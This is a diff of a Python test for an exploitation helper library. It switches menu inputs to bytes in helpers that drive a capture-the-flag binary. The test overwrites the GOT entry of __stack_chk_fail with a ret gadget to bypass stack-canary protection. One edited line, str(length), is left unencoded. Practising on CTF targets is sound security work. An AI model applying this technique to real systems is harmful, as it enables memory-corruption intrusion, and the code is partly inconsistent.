@@ -28,17 +28,17 @@ def test_pwn1():
     stk_chk = elf.got['__stack_chk_fail']
 
     def edit_addr_value(addr: int, value: bytes):
-        gb.sla('your choice', '0')
-        gb.sla('address:\n', str(addr))
-        gb.sa('content:\n', value)
+        gb.sla(b'your choice', b'0')
+        gb.sla(b'address:\n', str(addr).encode('ascii'))
+        gb.sa(b'content:\n', value)
 
     def edit_buf_value(length: int, value: bytes):
-        gb.sla('your choice', '1')
-        gb.sla('size:\n', str(length))
-        gb.sa('content:\n', value)
+        gb.sla(b'your choice', b'1')
+        gb.sla(b'size:\n', str(length))
+        gb.sa(b'content:\n', value)
 
     def program_exit():
-        gb.sla('your choice', '2')
+        gb.sla(b'your choice', b'2')
 
     edit_addr_value(stk_chk, gb.p64(pops['ret']))
 
